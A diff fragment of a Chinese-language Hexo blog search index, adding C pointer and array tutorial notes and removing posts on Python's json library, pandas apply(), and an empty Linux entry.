printf(&quot;%c%c\n&quot;,p1[0],p2[0]);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">* 这里的指针变量`t`虽然已经声明，但是没有指向任何一个内存地址，不可以用来存放其他变量的值</span><br><span class="line"></span><br><span class="line">* 比如:</span><br><span class="line"></span><br><span class="line">* ```c</span><br><span class="line">  #include &lt;stdio.h&gt;</span><br><span class="line">  #include &lt;stdlib.h&gt;</span><br><span class="line">  </span><br><span class="line">  void swap(int *p,int *q)</span><br><span class="line">  &#123;int *t;</span><br><span class="line">   t = (int *)malloc(sizeof(int));</span><br><span class="line">   *t = *q,*p = *q,*q = *t;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">* 如该代码，指针变量`t`初始已经指向了一个动态分配的地址，可以用于接收变量。</span><br><span class="line"></span><br><span class="line">#### 指针的赋值</span><br><span class="line"></span><br><span class="line">* C语言中专辑可以把变量地址赋值给同类型的指针变量，**不可以把变量和表达式地址赋值给指针**</span><br><span class="line">* 可以通过类型强制转换把一种类型的指针变量赋值给另外一种类型的指针变量。</span><br><span class="line"></span><br><span class="line">#### 函数中的操作</span><br><span class="line"></span><br><span class="line">* 比如:</span><br><span class="line"></span><br><span class="line">* ```c</span><br><span class="line">  #include &lt;stdio.h&gt;</span><br><span class="line">  </span><br><span class="line">  void swap(int * a,int * b)&#123; //这里的&#x27;*&#x27;符号，只是代表我们正在定义指针</span><br><span class="line">      int t = *a;</span><br><span class="line">      *a = *b;</span><br><span class="line">      *b = t;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  int main()&#123;</span><br><span class="line">      int a = 6;</span><br><span class="line">      int b = 3;</span><br><span class="line">      </span><br><span class="line">      printf(&quot;%d，%d\n&quot;, a,b);</span><br><span class="line">      swap(&amp;a, &amp;b);//此时传入的值是指针</span><br><span class="line">      printf(&quot;%d，%d&quot;, a,b);</span><br><span class="line">      </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">* 输出的结果为:</span><br><span class="line"></span><br><span class="line">* ```powershell</span><br><span class="line">  6，3</span><br><span class="line">  3，6</span><br><span class="line"></span><br><span class="line">* 我们可以进一步说明:</span><br><span class="line"></span><br><span class="line">* ```c</span><br><span class="line">  #include &lt;stdio.h&gt;</span><br><span class="line">  </span><br><span class="line">  void swap(int  a,int  b)&#123; //这里的&#x27;&#x27;符号，只是代表我们正在定义指针</span><br><span class="line">      int t = a;</span><br><span class="line">      a = b;</span><br><span class="line">      b = t;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  int main()&#123;</span><br><span class="line">      int a = 6;</span><br><span class="line">      int b = 3;</span><br><span class="line">      </span><br><span class="line">      printf(&quot;%d，%d\n&quot;, a,b);</span><br><span class="line">      swap(a, b);//此时传入的值是指针</span><br><span class="line">      printf(&quot;%d，%d&quot;, a,b);</span><br><span class="line">      </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">* 比如上述代码，就和我们的第一组代码有差异,这里没有使用指针对变量地址进行赋值,所以输出的值为:</span><br><span class="line"></span><br><span class="line">* ```powershell</span><br><span class="line">  6，3</span><br><span class="line">  6，3</span><br><span class="line"></span><br><span class="line">* 你可以发现，它的值并没有进行调换，所以:**只有修改变量地址才是真正的修改变量的值**。</span><br><span class="line"></span><br><span class="line">#### 数组中的操作</span><br><span class="line"></span><br><span class="line">##### 基础概念:</span><br><span class="line"></span><br><span class="line">* * 数组是一个常量：</span><br><span class="line"></span><br><span class="line">  * ```c</span><br><span class="line">    #include &lt;stdio.h&gt;</span><br><span class="line">    </span><br><span class="line">    int main()&#123;</span><br><span class="line">        int a = 6;</span><br><span class="line">        int b = 3;</span><br><span class="line">        int c[3] = &#123;1,2,3&#125;;</span><br><span class="line">    </span><br><span class="line">        c = &amp;a;</span><br><span class="line">    </span><br><span class="line">        printf(&quot;%d&quot;, c);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  * 像这样进行赋值，就会报错。</span><br><span class="line"></span><br><span class="line">* 对于数组的本质</span><br><span class="line"></span><br><span class="line">* * 简单来说，**数组和指针的本质区别就是，前者为常量，不可以赋值，后者为变量，可以被赋值，**其他操作方式其实都大同小异。</span><br><span class="line"></span><br><span class="line">  * 比如我们可以看以下代码:</span><br><span class="line"></span><br><span class="line">  * ```c</span><br><span class="line">    #include &lt;stdio.h&gt;</span><br><span class="line">    </span><br><span class="line">    int main()&#123;</span><br><span class="line">        int a = 6;</span><br><span class="line">        int b = 3;</span><br><span class="line">        int c[3] = &#123;1,2,3&#125;;</span><br><span class="line">    </span><br><span class="line">        printf(&quot;%d&quot;, *c);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  * 这里就是对类似于指针的数组`c`进行了解包,但是默认解包出来的数是数组的第一个数，即`1`,若要对下一位数进行解包,可以这样进行解包:`printf(&quot;%d&quot;, *(c+1))&#x27;;`会输出:`2` 相当于:`+1`是为了移位,`*`是为了解包。</span><br><span class="line"></span><br><span class="line">  * 这里我们可以知道一个规律是怎么来的了:**为什么编程语言的索引都是从0开始?**因为,在c语言中；对于数组`c`,`*(c+1)`和`c[1]`都是一个道理,为了保证形式上的相同，所以这样干。**数组索引不可以使用&#x27;()&#x27;**</span><br><span class="line"></span><br><span class="line">  * 我们这里可以继续说:</span><br><span class="line"></span><br><span class="line">  * ```c</span><br><span class="line">    #include &lt;stdio.h&gt;</span><br><span class="line">    </span><br><span class="line">    int main()&#123;</span><br><span class="line">        int a = 6;</span><br><span class="line">        int b = 3;</span><br><span class="line">        int c[3] = &#123;1,2,3&#125;;</span><br><span class="line">    </span><br><span class="line">        int * p = c;</span><br><span class="line">    </span><br><span class="line">        printf(&quot;%d&quot;, p[1]);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  * 这里一样可以把指针`p`当成数组进行索引分配。输出`2`。</span><br><span class="line"></span><br><span class="line">  ##### 指针数组:</span><br><span class="line"></span><br><span class="line">  * &#123;% asset_img image-20250302175735900.png image-20250302175735900 %&#125;</span><br><span class="line"></span><br><span class="line">* 这里我们出现了疑问:为什么我们使用int a = 6;int * p = a就会出错，而使用b = &#123;1,2,3&#125;;int * p = b;就不会出错呢,数组就不出错?</span><br><span class="line"></span><br><span class="line">* 原因如下:</span><br><span class="line"></span><br><span class="line">* `int a = 6; int *p = a;` 出错原因</span><br><span class="line"></span><br><span class="line">  - `int *p` 声明了一个指针变量`p`，指针变量是用来存储内存地址的，它要求赋值给它的应该是一个合法的内存地址。</span><br><span class="line">  - 而`int a = 6;` 定义了一个整型变量`a`并初始化为`6`，`6`只是一个普通的整数值，并非内存地址，所以直接将`a`的值赋给指针变量`p`，会导致类型不匹配错误，编译器会报错。正确的做法应该是将`a`的地址赋给`p`，即`int *p = &amp;a;`，这里`&amp;`是取地址运算符，`&amp;a`表示获取变量`a`在内存中的地址。</span><br><span class="line"></span><br><span class="line">* 数组情况不出错的原因。</span><br><span class="line"></span><br><span class="line">  - 在 C 语言中，数组名在表达式中使用时，会被隐式转换为指向数组首元素的指针。当定义`int b[] = &#123;1,2,3&#125;;` 时，`b` 代表数组`b`的首地址，它的类型本质上是`int *` （指向`int`类型的指针） 。</span><br><span class="line">  - 所以`int *p = b;` 这种写法是将数组`b`的首地址赋值给指针变量`p`，两者类型匹配，因此不会出错，此时`p`就指向了数组`b`的第一个元素，可以通过`p`来操作数组元素，比如`p[0]` 等价于`b[0]` ，都表示访问数组的第一个元素`1`。</span><br><span class="line">  </span><br><span class="line">* **这里我们可以进行一个总结：**</span><br><span class="line"></span><br><span class="line">* * 在 C 语言中对于数组`a[3]` ，在很多情况下数组名`a`会被隐式转换为指向数组首元素的地址：</span><br><span class="line"></span><br><span class="line">    - **赋值场景**：当把数组名赋值给指针变量时，如`int *p = a;` ，这里数组名`a`就被当作指向数组首元素`a[0]`的地址，将该地址赋给指针`p` ，使`p`也指向数组首元素。</span><br><span class="line">    - **表达式场景**：在涉及地址计算和操作的表达式中，例如`a + 1`，这里`a`同样被视为指向数组首元素的地址，`a + 1`表示指向数组第二个元素`a[1]`的地址 。</span><br><span class="line">    - **函数参数传递场景**：当数组作为函数参数时，比如定义函数`void func(int arr[])` ，调用`func(a)` ，实际上传递给函数的是数组`a`首元素的地址，在函数内部`arr`就相当于一个指向传入数组首元素的指针。</span><br><span class="line"></span><br><span class="line">    不过要注意，数组名在`sizeof`运算符中例外，`sizeof(a)`得到的是整个数组占用的字节数，此时`a`不被当作指针，而是代表整个数组 。</span><br><span class="line"></span><br><span class="line">* 对于指针与数组:</span><br><span class="line"></span><br><span class="line">* * 比如:`int *p = a `,这里也是把数组`a`首位元素地址赋值给了新定义的整型指针`p`,然后我们就可以用:`a[i]`以及`*(a+i)`、`*(p+i)`、`p[i]`这些方法对元素进行移动要注意:没有`*a[i]`或`*p[i]`的写法。</span><br><span class="line"></span><br><span class="line">#### 指针数组与高维数组的详细理解</span><br><span class="line"></span><br><span class="line">* 例子:</span><br><span class="line"></span><br><span class="line">* ```c</span><br><span class="line">  #include &lt;stdio.h&gt;</span><br><span class="line">  </span><br><span class="line">  int main()&#123;</span><br><span class="line">      int a[3][4] = &#123;&#123;1,2,3,4&#125;,&#123;5,6,7,8&#125;,&#123;9,10,11,12&#125;&#125;, *ap[3];</span><br><span class="line">  </span><br><span class="line">      for(int i=0; i&lt;3; i++)&#123;</span><br><span class="line">          ap[i] = a[i];</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      printf(&quot;%d&quot;, **(ap+1));//这一行可以改为:*(ap+1),ap[1],*ap[1],*(ap[1]+1)</span><br><span class="line">  </span><br><span class="line">      return 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">* 首先对于`for(int i=0; i&lt;3; i++)`这行代码:</span><br><span class="line"></span><br><span class="line">* * 在高维数组中(比如这里的二维数组),这里a[i]就是第i行的第一个数字的地址。</span><br><span class="line">  * 而ap[i]是一个指针,(类型:`*int`)在这里,就把就是第i行的第一个数字的**地址**赋值给了`ap[i]`,如果是字符串的话,比如:`str[2][10] = &#123;&quot;aaa&quot;,&quot;bbbbb&quot;&#125;`，这种，要让指针数组(`strp`),指向数组:`strp[i] = str[i]`，那么这里指针代表的是蒂耶戈字符串所有的地址。</span><br><span class="line">  * 而`ap`代表的就是指向元素为指针的数组的首位元素，即指针的指针:类型:`**int`,所以，要进行两次解包才行:`**(ap+1)`</span><br><span class="line">  * 所以ap[1]呈现出来的是一个地址而非具体值，因为数组`ap`的元素是指针，指向了地址,这里就和一维数组不一样，一维数组使用这样的中括号索引就是具体值，而在指针数列里，这里的具体值则是地址，所以，我使用`*ap[1]`就会得到具体值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### 指针数组以及指针的指针</span><br><span class="line"></span><br><span class="line">##### 指针数组</span><br><span class="line"></span><br><span class="line">* 比如:</span><br><span class="line">* &#123;% asset_img image-20250303075709855.png image-20250303075709855 %&#125;</span><br><span class="line">* 使用语法`char *s[6]`就是定义一个指针数组并且对其初始化,6个指针分别对应6个字符串。</span><br><span class="line"></span><br><span class="line">#### 自定义数据结构里面的指针</span><br><span class="line"></span><br><span class="line">* 有以下例题:</span><br><span class="line">* &lt;style&gt;.rnfufgbmvjzu&#123;zoom:150%;&#125;&lt;/style&gt;&#123;% asset_img rnfufgbmvjzu image-20250305135039466.png &#x27;&quot;&quot;&quot;image-20250305135039466&quot;&#x27; %&#125;</span><br><span class="line">* 要点一:对于`struct st a[3] = &#123;5,&amp;a[0], 6,&amp;a[1], 7,&amp;a[2]&#125;, *p;`这里由于该结构在初始化的时候，需要两个值来初始化，所以`5,&amp;a[0]`就构成了数组`a`的第一个元素`a[0]`的初始化内容 ，`6,&amp;a[1]` 、`7,&amp;a[2]`分别对应`a[1]`和`a[2]`的初始化内容。</span><br><span class="line">* 要点二:这里对`st`数据结构数组的值的导入，比如:`5,&amp;a[0]`,这里第二个值为`&amp;a[0]`，就是对`st *next`的赋值，即指向的下一个元素是它本身。</span><br><span class="line">* 要点三:指针的数据结构必须和要指向的目标元素的类型相同，才可以进行指向。</span><br><span class="line">* 要点四:`p=&amp;a[0]`,这里就是指向数组a的第一个元素的的地址，包含：`(int n ,struct st *next)`,我们对指针进行移动:`(++p)`,再进行指向:`-&gt;`,**其中:`-&gt;`这个方法就已经对数据结构其中的元素进行了解包**,所以不需要`*p`对数据解包了。</span><br><span class="line"></span><br><span class="line">#### 指针在动态内存中的操作</span><br><span class="line"></span><br><span class="line">* 如例题:</span><br><span class="line"></span><br><span class="line">* ```c</span><br><span class="line">  #include &lt;stdio.h&gt;</span><br><span class="line">  #include &lt;string.h&gt;</span><br><span class="line">  #include &lt;stdlib.h&gt;</span><br><span class="line">  void main()</span><br><span class="line">  &#123;</span><br><span class="line">      char *p1,*p2;</span><br><span class="line">      p1=p2=(char *)malloc(sizeof(char)*10);</span><br><span class="line">      strcpy(p1,&quot;malloc&quot;);</span><br><span class="line">      strcpy(p2,p1 + 1);</span><br><span class="line">      printf(&quot;%c%c\n&quot;,p1[0],p2[0]);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
 </code></pre>
 </li>
 <li><p>问:最后输出的值是什么</p>
@@ -2047,45 +2141,6 @@ sum += *s - &#39;0&#39;;
       </tags>
   </entry>
   <entry>
-    <title>json学习</title>
-    <url>/2025/03/07/json%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="json库学习"><a href="#json库学习" class="headerlink" title="json库学习"></a>json库学习</h1><h2 id="转码为dict格式文件"><a href="#转码为dict格式文件" class="headerlink" title="转码为dict格式文件"></a>转码为dict格式文件</h2><ul>
-<li>比如有以下python数据</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#综合数据集</span></span><br><span class="line">        decision_metadata = &#123;</span><br><span class="line">            <span class="string">&quot;model_version&quot;</span>: <span class="string">&quot;xgb_v3.1+bert_v2.4&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;xgb_pred&#x27;</span>: xgb_pred,</span><br><span class="line">            <span class="string">&#x27;bert_pred&#x27;</span>: bert_pred,</span><br><span class="line">            <span class="string">&#x27;xgb_proba&#x27;</span>: xgb_proda,</span><br><span class="line">            <span class="string">&#x27;bert_proba&#x27;</span>: bert_proda,</span><br><span class="line">            <span class="string">&#x27;xgb_detailed_proda&#x27;</span>: xgb_detailed_proda,</span><br><span class="line">            <span class="string">&#x27;bert_detailed_proda&#x27;</span>: bert_detailed_proda,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>进行json格式转码，即，讲该字典格式数据编码为<code>json</code>格式数据</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dc_metadata_json = json.dumps(decision_metadata)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>即采用，<code>json.dumps()</code>方法,当然，你要先使用<code>import json</code>的操作。</li>
-</ul>
-<h2 id="json格式数据写入txt文档"><a href="#json格式数据写入txt文档" class="headerlink" title="json格式数据写入txt文档"></a>json格式数据写入txt文档</h2><h3 id="步骤一：导入必要的模块"><a href="#步骤一：导入必要的模块" class="headerlink" title="步骤一：导入必要的模块"></a>步骤一：导入必要的模块</h3><p>需要导入<code>json</code>模块用于处理 JSON 数据。示例代码：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br></pre></td></tr></table></figure>
-
-<h3 id="步骤二：准备-JSON-格式的-Python-数据"><a href="#步骤二：准备-JSON-格式的-Python-数据" class="headerlink" title="步骤二：准备 JSON 格式的 Python 数据"></a>步骤二：准备 JSON 格式的 Python 数据</h3><p>JSON 数据在 Python 中通常以字典、列表等数据结构表示。例如：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;张三&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="number">30</span>,</span><br><span class="line">    <span class="string">&quot;hobbies&quot;</span>: [<span class="string">&quot;阅读&quot;</span>, <span class="string">&quot;跑步&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="步骤三：将-JSON-数据转换为字符串"><a href="#步骤三：将-JSON-数据转换为字符串" class="headerlink" title="步骤三：将 JSON 数据转换为字符串"></a>步骤三：将 JSON 数据转换为字符串</h3><p>使用<code>json.dumps()</code>方法将 Python 中的 JSON 数据转换为字符串格式，方便写入 txt 文件。<code>json.dumps()</code>方法还可以通过一些参数进行格式化输出，如<code>indent</code>参数指定缩进，<code>ensure_ascii</code>参数设置是否以 ASCII 编码显示字符（<code>False</code>表示按原字符显示，常用于处理中文等非 ASCII 字符）。示例代码：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">json_str = json.dumps(data, indent=<span class="number">4</span>, ensure_ascii=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="步骤四：打开-txt-文件并写入数据"><a href="#步骤四：打开-txt-文件并写入数据" class="headerlink" title="步骤四：打开 txt 文件并写入数据"></a>步骤四：打开 txt 文件并写入数据</h3><p>使用<code>open()</code>函数以写入（<code>&#39;w&#39;</code>）或追加（<code>&#39;a&#39;</code>）模式打开 txt 文件。<code>&#39;w&#39;</code>模式会覆盖原有文件内容；<code>&#39;a&#39;</code>模式则会在文件末尾添加新内容，若文件不存在会自动创建。使用<code>write()</code>方法将转换后的 JSON 字符串写入文件，操作完成后文件会在<code>with</code>语句块结束时自动关闭。示例代码：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 以写入模式打开文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(json_str)</span><br><span class="line"><span class="comment"># 以追加模式打开文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(json_str + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>如果 JSON 数据原本存储在文件中，先读取该 JSON 文件再写入 txt 文件，示例如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取JSON文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;input.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> json_file:</span><br><span class="line">    data = json.load(json_file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将JSON数据转换为字符串</span></span><br><span class="line">json_str = json.dumps(data, indent=<span class="number">4</span>, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入txt文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> txt_file:</span><br><span class="line">    txt_file.write(json_str) </span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>json库</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>langchain历史记录管理</title>
     <url>/2025/02/20/langchain%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E7%AE%A1%E7%90%86/</url>
     <content><![CDATA[<h1 id="langchain历史记录管理"><a href="#langchain历史记录管理" class="headerlink" title="langchain历史记录管理"></a>langchain历史记录管理</h1><h2 id="输入的消息类型"><a href="#输入的消息类型" class="headerlink" title="输入的消息类型:"></a>输入的消息类型:</h2><ul>
@@ -2127,17 +2182,6 @@ sum += *s - &#39;0&#39;;
       </categories>
       <tags>
         <tag>langchain</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>linux基础</title>
-    <url>/2025/01/11/linux%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>基本符号</tag>
       </tags>
   </entry>
   <entry>
@@ -2188,51 +2232,14 @@ print(new_data)
       </tags>
   </entry>
   <entry>
-    <title>pandas库学习(持续更新)</title>
-    <url>/2025/03/08/pandas%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="python-pandas库学习"><a href="#python-pandas库学习" class="headerlink" title="python pandas库学习"></a>python pandas库学习</h1><h2 id="apply-方法"><a href="#apply-方法" class="headerlink" title="apply() 方法"></a><code>apply()</code> 方法</h2><p><code>pandas</code> 中的 <code>apply</code> 方法是一个非常灵活且强大的工具，可用于对 <code>Series</code> 或 <code>DataFrame</code> 对象中的元素、行或列应用自定义函数。下面为你从多个方面详细介绍其用法。</p>
-<h3 id="1-对-Series-对象使用-apply"><a href="#1-对-Series-对象使用-apply" class="headerlink" title="1. 对 Series 对象使用 apply"></a>1. 对 <code>Series</code> 对象使用 <code>apply</code></h3><p><code>Series</code> 是一维带标签数组，<code>apply</code> 可对其中每个元素应用指定函数。</p>
-<h4 id="基础示例"><a href="#基础示例" class="headerlink" title="基础示例"></a>基础示例</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 Series</span></span><br><span class="line">s = pd.Series([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个简单的函数，用于将元素乘以 2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multiply_by_two</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x * <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 方法应用函数</span></span><br><span class="line">result = s.apply(multiply_by_two)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
-
-<p>在这个例子中，<code>multiply_by_two</code> 函数被应用到 <code>Series</code> 的每个元素上，将每个元素都乘以 2。</p>
-<h4 id="使用匿名函数（lambda-函数）"><a href="#使用匿名函数（lambda-函数）" class="headerlink" title="使用匿名函数（lambda 函数）"></a>使用匿名函数（<code>lambda</code> 函数）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">s = pd.Series([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"><span class="comment"># 使用 lambda 函数进行同样的操作</span></span><br><span class="line">result = s.apply(<span class="keyword">lambda</span> x: x * <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
-
-<p><code>lambda</code> 函数让代码更简洁，适合实现简单逻辑。</p>
-<h3 id="2-对-DataFrame-对象使用-apply"><a href="#2-对-DataFrame-对象使用-apply" class="headerlink" title="2. 对 DataFrame 对象使用 apply"></a>2. 对 <code>DataFrame</code> 对象使用 <code>apply</code></h3><p><code>DataFrame</code> 是二维表格型数据结构，<code>apply</code> 可按行或列应用函数，通过 <code>axis</code> 参数控制。</p>
-<h4 id="按列应用函数（axis-0）"><a href="#按列应用函数（axis-0）" class="headerlink" title="按列应用函数（axis = 0）"></a>按列应用函数（<code>axis = 0</code>）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 DataFrame</span></span><br><span class="line">df = pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，用于计算每列的和</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_sum</span>(<span class="params">column</span>):</span><br><span class="line">    <span class="keyword">return</span> column.<span class="built_in">sum</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 按列应用函数</span></span><br><span class="line">result = df.apply(column_sum, axis=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
-
-<p>这里 <code>axis = 0</code> 表示按列操作，函数会依次对每列进行计算。</p>
-<h4 id="按行应用函数（axis-1）"><a href="#按行应用函数（axis-1）" class="headerlink" title="按行应用函数（axis = 1）"></a>按行应用函数（<code>axis = 1</code>）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，用于计算每行的和</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">row_sum</span>(<span class="params">row</span>):</span><br><span class="line">    <span class="keyword">return</span> row[<span class="string">&#x27;A&#x27;</span>] + row[<span class="string">&#x27;B&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 按行应用函数</span></span><br><span class="line">result = df.apply(row_sum, axis=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
-
-<p><code>axis = 1</code> 表示按行操作，函数会依次对每行进行计算。</p>
-<h3 id="3-传递额外参数"><a href="#3-传递额外参数" class="headerlink" title="3. 传递额外参数"></a>3. 传递额外参数</h3><p><code>apply</code> 方法允许传递额外参数给自定义函数。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">s = pd.Series([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，接受额外参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_value</span>(<span class="params">x, value</span>):</span><br><span class="line">    <span class="keyword">return</span> x + value</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 并传递额外参数</span></span><br><span class="line">result = s.apply(add_value, args=(<span class="number">3</span>,))</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
-
-<p>在这个例子中，<code>args</code> 参数是一个元组，包含要传递给 <code>add_value</code> 函数的额外参数。</p>
-<h3 id="4-处理缺失值"><a href="#4-处理缺失值" class="headerlink" title="4. 处理缺失值"></a>4. 处理缺失值</h3><p><code>apply</code> 方法会自动处理缺失值（<code>NaN</code>），它会将缺失值原样保留。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">s = pd.Series([<span class="number">1</span>, np.nan, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">square</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 方法</span></span><br><span class="line">result = s.apply(square)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
-
-<p>可以看到，<code>NaN</code> 值在处理后依然是 <code>NaN</code>。</p>
-<h3 id="5-返回不同类型结果"><a href="#5-返回不同类型结果" class="headerlink" title="5. 返回不同类型结果"></a>5. 返回不同类型结果</h3><p><code>apply</code> 方法可以返回不同类型的结果，例如返回 <code>Series</code> 或 <code>DataFrame</code></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，返回一个 Series</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_function</span>(<span class="params">row</span>):</span><br><span class="line">    <span class="keyword">return</span> pd.Series([row[<span 